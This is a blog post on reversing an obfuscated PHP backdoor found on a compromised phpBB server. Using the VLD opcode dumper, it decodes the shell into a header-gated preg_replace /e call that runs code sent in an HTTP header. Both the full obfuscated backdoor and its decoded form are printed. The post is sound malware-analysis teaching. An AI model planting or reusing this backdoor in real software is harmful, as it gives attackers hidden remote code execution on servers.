---
date: 2014-08-09 00:00:00 -0500
layout: post
title: Reversing an Obfuscated Backdoor
tags:
  - PHP
  - Obfuscation
  - VLD
---

While idling in ##php, every once in a while a user says they've found a
peculiar file in their document root.  Every time, this means it was a shell
that someone had used some sort of an exploit to place on the server. Every
time, the user is adamant that they must know what this code does, instead of
just removing it and finding how it was planted.

Follows is how I would use VLD to deobfuscate its payload.

In this case it was a phpBB install with exploitable custom extensions, and the
user was quite rude.  Both pretty average for this sort of thing.  Getting them
to pastebin the code nearly took longer than deobfuscating it. When I finally
got to see it in all its sneaky glory I was a bit taken aback.

{% highlight php startinline %}

$N2a='dvADoy'&~UNt8GAiXc2G;$DAWi='/>-LEZ#*U4)'^'A[[;+-'.KT0_G;$vhne8tDK=#ZoBluzBk9w'.
     '}owo~sn~wmn'&'}}wm~'.wkto.'{~';$NjKiZ=ohWzjE^')'.Ms_H7;$kZoehuqrTg7='@'./*HBu'.
     '.lY4UiKKR>*/YPZ_a|'H]D^NC';$IJ6e='ND4@ZQ'|'xP]P]Q';$rAMg='((FG*QJZ=)4"'^'XZ! '.
     'u//!'.QHWO;$u4K5='0=BG5 _)+0J='^'FO7(jR:YUU-H';$LilYxx78="5"|'4';'CLF8BrCJLpk'.
     ',#SorX>z-';$sbaJHeSnD='F*'^jq;$eNlv9Ak='|g7'&"i|u";$Sv3SzRL8='_~G`wK'^#nqQrxm'.
     '8:3!;-';$IV='#1#2%'|'a51!E';$BscVpr2Ii=' 00'|'e #';$umdcK=_^'9';$kFDxdcROJ=/*'.
     '90Cg*/km&iw;$X2iSZAD_uGC=';p{bo'^'s$/20';$IleWkFMnzQq='}'&Z;$JD=KD&'}V';'bbsx'.
     '?U8';$pKlSp2V=$DAWi&$vhne8tDK;$rGLmFTY=('$@$'|'- !')|$eNlv9Ak;$IdQ_wkDqX=/*Rd'.
     '{]N3*/$NjKiZ|$Sv3SzRL8;$XWnPayhg=('"!N?7:&I+'.aR8Q9^'AR"'.QhGU.',]>4M?V')&(#U'.
     'ga~}_w{}{'._owns&'gu~}_w{}{'._ownw);$buCz=$kZoehuqrTg7&$IJ6e;$D1=$rAMg&/*hwZM'.
     '0%y6K^|*/$u4K5;$NtOOvR7dR=('P0Z@"&@ F4C '.XxBH.'- 00Z(<Y f A'|#lsVfS785TuIYpT'.
     '@qzJ &H0 ,@1'.QhbB00.'" R ,[%F0e')^('~^$B*O,'.bXPf5lH.'}]LX4$Y`0r-e7z'^/*dBGL'.
     'BXK4.o{*/Klo9k.'*U8g;]wTg*y=?~da%Y]iTV"');if(!$pKlSp2V($rGLmFTY($IdQ_wkDqX(/*'.
     'd[v&U*/$buCz)),('rLO:^}e+w]_Tp?'._ij7Ugk.']'^FuwXkKWMGn.'<c@^'.nQRRd_.'^<')./*'.
     'y*/$IV.$LilYxx78.$BscVpr2Ii.$umdcK))$XWnPayhg($D1,$sbaJHeSnD.('Zj]<o'&#sdZtUt'.
     '~o]nm').$kFDxdcROJ,$IdQ_wkDqX($X2iSZAD_uGC.$IleWkFMnzQq.$JD),$NtOOvR7dR);#Np'.
     'VuQ[$p:PZ>HRfi)+z@??To#EX345]2q-JUq(p&,E+1ah';

{% endhighlight %}

A bit more interesting than most that I've seen.  Usually `eval` or
`preg_replace` or something similar visible - and the code is never so tidy and
unreadable.

I'll admit it, I was a little impressed.

To start all of this I spun up a [vagrant][vagrant_homepage] virtual machine
with the [Vulcan Logic Decoder][pecl_vld] included.  I tested that this was
indeed loaded and working before I even downloaded the nefarious file.  Better
safe than sorry, right?

What VLD does is really quite amazing.  It allows you to retrieve the internal
representation of PHP scripts known as [opcodes][zend2_opcodes] in a way that
can be understood by mere humans.  When running the `php` command with the VLD
module loaded you have new ini options - specifiable at the command line if you
choose to do so.  These are `vld.active` to enable the decoder to run and the
interesting `vld.execute` flag which can allow you to turn off code execution.
What it boils down to is that you can figure out what a script is trying to do
without ever running it at all.

```
$ php -dvld.active=1 -dvld.execute=0 o.php

Finding entry points
Branch analysis from position: 0
Jump found. Position 1 = 147, Position 2 = 164
Branch analysis from position: 147
Return found
Branch analysis from position: 164
filename:       o.php
function name:  (null)
number of ops:  166
compiled vars:  !0 = $N2a, !1 = $DAWi, !2 = $vhne8tDK, !3 = $NjKiZ, !4 = $kZoehuqrTg7,
                !5 = $IJ6e, !6 = $rAMg, !7 = $u4K5, !8 = $LilYxx78, !9 = $sbaJHeSnD,
                !10 = $eNlv9Ak, !11 = $Sv3SzRL8, !12 = $IV, !13 = $BscVpr2Ii,
                !14 = $umdcK, !15 = $kFDxdcROJ, !16 = $X2iSZAD_uGC, !17 = $IleWkFMnzQq,
                !18 = $JD, !19 = $pKlSp2V, !20 = $rGLmFTY, !21 = $IdQ_wkDqX, !22 = $XWnPayhg,
                !23 = $buCz, !24 = $D1, !25 = $NtOOvR7dR
line     # *  op                           fetch          ext  return  operands
---------------------------------------------------------------------------------
   3     0  >   EXT_STMT
         1      FETCH_CONSTANT                                   ~0      'UNt8GAiXc2G'
         2      BW_NOT                                           ~1      ~0
         3      BW_AND                                           ~0      'dvADoy', ~1
         4      ASSIGN                                                   !0, ~0
         5      EXT_STMT
         6      FETCH_CONSTANT                                   ~0      'KT0_G'
         7      CONCAT                                           ~1      'A%5B%5B%3B%2B-', ~0
         8      BW_XOR                                           ~0      '%2F%3E-LEZ%23%2AU4%29', ~1
         9      ASSIGN                                                   !1, ~0
   4    10      EXT_STMT
        11      FETCH_CONSTANT                                   ~1      'wkto'
        12      CONCAT                                           ~0      '%7D%7Dwm%7E', ~1
        13      CONCAT                                           ~1      ~0, '%7B%7E'
        14      BW_AND                                           ~0      '%7Dowo%7Esn%7Ewmn', ~1
        15      ASSIGN                                                   !2, ~0
        16      EXT_STMT
        17      FETCH_CONSTANT                                   ~1      'ohWzjE'
        18      FETCH_CONSTANT                                   ~0      'Ms_H7'
        19      CONCAT                                           ~2      '%29', ~0
        20      BW_XOR                                           ~0      ~1, ~2
        21      ASSIGN                                                   !3, ~0
   5    22      EXT_STMT
        23      FETCH_CONSTANT                                   ~0      'YPZ_a'
        24      CONCAT                                           ~1      '%40', ~0
        25      BW_OR                                            ~0      ~1, 'H%5DD%5ENC'
        26      ASSIGN                                                   !4, ~0
        27      EXT_STMT
        28      ASSIGN                                                   !5, '%7ET%7DP_Q'
   6    29      EXT_STMT
        30      FETCH_CONSTANT                                   ~0      'QHWO'
        31      CONCAT                                           ~1      'XZ%21+u%2F%2F%21', ~0
        32      BW_XOR                                           ~0      '%28%28FG%2AQJZ%3D%294%22', ~1
        33      ASSIGN                                                   !6, ~0
        34      EXT_STMT
        35      ASSIGN                                                   !7, 'vruo_rep%7Eegu'
        36      EXT_STMT
        37      ASSIGN                                                   !8, '5'
   7    38      EXT_STMT
        39      EXT_STMT
        40      FETCH_CONSTANT                                   ~1      'jq'
        41      BW_XOR                                           ~0      'F%2A', ~1
        42      ASSIGN                                                   !9, ~0
        43      EXT_STMT
        44      ASSIGN                                                   !10, 'hd5'
   8    45      EXT_STMT
        46      ASSIGN                                                   !11, 'gDtALf'
        47      EXT_STMT
        48      ASSIGN                                                   !12, 'c533e'
        49      EXT_STMT
        50      ASSIGN                                                   !13, 'e03'
        51      EXT_STMT
        52      FETCH_CONSTANT                                   ~1      '_'
        53      BW_XOR                                           ~0      ~1, '9'
        54      ASSIGN                                                   !14, ~0
   9    55      EXT_STMT
        56      FETCH_CONSTANT                                   ~1      'km'
        57      FETCH_CONSTANT                                   ~2      'iw'
        58      BW_AND                                           ~0      ~1, ~2
        59      ASSIGN                                                   !15, ~0
        60      EXT_STMT
        61      ASSIGN                                                   !16, 'HTTP_'
        62      EXT_STMT
        63      FETCH_CONSTANT                                   ~1      'Z'
        64      BW_AND                                           ~0      '%7D', ~1
        65      ASSIGN                                                   !17, ~0
        66      EXT_STMT
        67      FETCH_CONSTANT                                   ~1      'KD'
        68      BW_AND                                           ~0      ~1, '%7DV'
        69      ASSIGN                                                   !18, ~0
  10    70      EXT_STMT
        71      EXT_STMT
        72      BW_AND                                           ~0      !1, !2
        73      ASSIGN                                                   !19, ~0
        74      EXT_STMT
        75      BW_OR                                            ~0      '-%60%25', !10
        76      ASSIGN                                                   !20, ~0
  11    77      EXT_STMT
        78      BW_OR                                            ~0      !3, !11
        79      ASSIGN                                                   !21, ~0
        80      EXT_STMT
        81      FETCH_CONSTANT                                   ~1      'aR8Q9'
        82      CONCAT                                           ~0      '%22%21N%3F7%3A%26I%2B', ~1
        83      FETCH_CONSTANT                                   ~2      'QhGU'
        84      CONCAT                                           ~1      'AR%22', ~2
        85      CONCAT                                           ~2      ~1, '%2C%5D%3E4M%3FV'
        86      BW_XOR                                           ~1      ~0, ~2
  12    87      FETCH_CONSTANT                                   ~2      '_owns'
        88      CONCAT                                           ~0      'ga%7E%7D_w%7B%7D%7B', ~2
        89      FETCH_CONSTANT                                   ~2      '_ownw'
        90      CONCAT                                           ~3      'gu%7E%7D_w%7B%7D%7B', ~2
        91      BW_AND                                           ~2      ~0, ~3
        92      BW_AND                                           ~0      ~1, ~2
        93      ASSIGN                                                   !22, ~0
        94      EXT_STMT
        95      BW_AND                                           ~0      !4, !5
        96      ASSIGN                                                   !23, ~0
  13    97      EXT_STMT
        98      BW_AND                                           ~0      !6, !7
        99      ASSIGN                                                   !24, ~0
       100      EXT_STMT
       101      FETCH_CONSTANT                                   ~0      'XxBH'
       102      CONCAT                                           ~1      'P0Z%40%22%26%40+F4C+', ~0
       103      CONCAT                                           ~0      ~1, '-+00Z%28%3CY+f+A'
  14   104      FETCH_CONSTANT                                   ~2      'QhbB00'
       105      CONCAT                                           ~1      '%40qzJ+%26H0+%2C%401', ~2
       106      CONCAT                                           ~2      ~1, '%22+R+%2C%5B%25F0e'
       107      BW_OR                                            ~1      ~0, ~2
       108      FETCH_CONSTANT                                   ~0      'bXPf5lH'
       109      CONCAT                                           ~2      '%7E%5E%24B%2AO%2C', ~0
       110      CONCAT                                           ~0      ~2, '%7D%5DLX4%24Y%600r-e7z'
  15   111      FETCH_CONSTANT                                   ~2      'Klo9k'
       112      CONCAT                                           ~3      ~2, '%2AU8g%3B%5DwTg%2Ay%3D%3F%7Eda%25Y%5DiTV%22'
       113      BW_XOR                                           ~2      ~0, ~3
       114      BW_XOR                                           ~0      ~1, ~2
       115      ASSIGN                                                   !25, ~0
       116      EXT_STMT
       117      INIT_FCALL_BY_NAME                                       !19
       118      EXT_FCALL_BEGIN
       119      INIT_FCALL_BY_NAME                                       !20
       120      EXT_FCALL_BEGIN
       121      INIT_FCALL_BY_NAME                                       !21
       122      EXT_FCALL_BEGIN
  16   123      SEND_VAR                                                 !23
       124      DO_FCALL_BY_NAME                              1  $0
       125      EXT_FCALL_END
       126      SEND_VAR_NO_REF                               4          $0
       127      DO_FCALL_BY_NAME                              1  $0
       128      EXT_FCALL_END
       129      SEND_VAR_NO_REF                               4          $0
       130      FETCH_CONSTANT                                   ~1      '_ij7Ugk'
       131      CONCAT                                           ~0      'rLO%3A%5E%7De%2Bw%5D_Tp%3F', ~1
       132      CONCAT                                           ~1      ~0, '%5D'
       133      FETCH_CONSTANT                                   ~0      'FuwXkKWMGn'
       134      CONCAT                                           ~2      ~0, '%3Cc%40%5E'
       135      FETCH_CONSTANT                                   ~3      'nQRRd_'
       136      CONCAT                                           ~0      ~2, ~3
       137      CONCAT                                           ~2      ~0, '%5E%3C'
       138      BW_XOR                                           ~0      ~1, ~2
  17   139      CONCAT                                           ~1      ~0, !12
       140      CONCAT                                           ~0      ~1, !8
       141      CONCAT                                           ~1      ~0, !13
       142      CONCAT                                           ~0      ~1, !14
       143      SEND_VAL                                                 ~0
       144      DO_FCALL_BY_NAME                              2  $0
       145      EXT_FCALL_END
       146    > JMPNZ                                                    $0, ->164
       147  >   INIT_FCALL_BY_NAME                                       !22
       148      EXT_FCALL_BEGIN
       149      SEND_VAR                                                 !24
  18   150      CONCAT                                           ~1      !9, 'Zj%5D%2Cm'
       151      CONCAT                                           ~0      ~1, !15
       152      SEND_VAL                                                 ~0
       153      INIT_FCALL_BY_NAME                                       !21
       154      EXT_FCALL_BEGIN
       155      CONCAT                                           ~1      !16, !17
       156      CONCAT                                           ~0      ~1, !18
       157      SEND_VAL                                                 ~0
       158      DO_FCALL_BY_NAME                              1  $0
       159      EXT_FCALL_END
       160      SEND_VAR_NO_REF                               4          $0
       161      SEND_VAR                                                 !25
       162      DO_FCALL_BY_NAME                              4
       163      EXT_FCALL_END
  21   164  >   EXT_STMT
       165    > RETURN                                                   1

branch: #  0; line:     3-   17; sop:     0; eop:   146; out1: 147; out2: 164
branch: #147; line:    17-   21; sop:   147; eop:   163; out1: 164
branch: #164; line:    21-   21; sop:   164; eop:   165
path #1: 0, 147, 164,
path #2: 0, 164,
```

While this is decoded from the series of trees and pointers that PHP uses to
keep track of pointers it does take a little finesse to even understand what
the opcodes are trying to do.  What that means is you have to just go
back and forth with the [opcode reference guide][zend2_opcodes].  But what does
it all mean?!

Well, looking at it you can see there are a _lot_ of `BW_OR` and `BW_AND` - the
bitwise operators `|` and `&`.  What's interesting about this is that, like in
the first one (`BW_AND 'dvADoy', ~1`) the operator is working on a string.
Bitwise operations on strings do work!  It applies the bitwise operators to each
character in the string.  This just spells ugliness.  Well, actually, it spells
` 0D(8` - still ugly.

Reading further down it is mostly bitwise operations on strings, concatenations (`CONCAT`),
and defining more string literals (`FETCH_CONSTANT`).

???

When you put it all together we have our script in a way even mortals can
comprehend.

{% highlight php startinline %}

if (!levenshtein(md5(getenv('HTTP_A')), '498b562f03c70a188e185ac533e5e03f'))
	call_user_func(
        'preg_replace',
        ',[Zj],mie',
        getenv('HTTP_XID'),
        'eC11cC1jYWxsaW5nLWxpbmUtaWQ='
    );

{% endhighlight %}

The script checked if an MD5 checksum of the `A` header received from the client
matched a known hash.  If it did it executed any code found in the received
`XID` header.  What did it mean for the user, though?  They still had no idea
what code was run and were no closer to knowing what more could have happened
than before.

They deleted the file, cursed a bit, and were on their way just as quickly as
they arrived.  Just another normal day.


[pecl_vld]: http://pecl.php.net/package/vld
[zend2_opcodes]: http://php.net/manual/internals2.opcodes.php
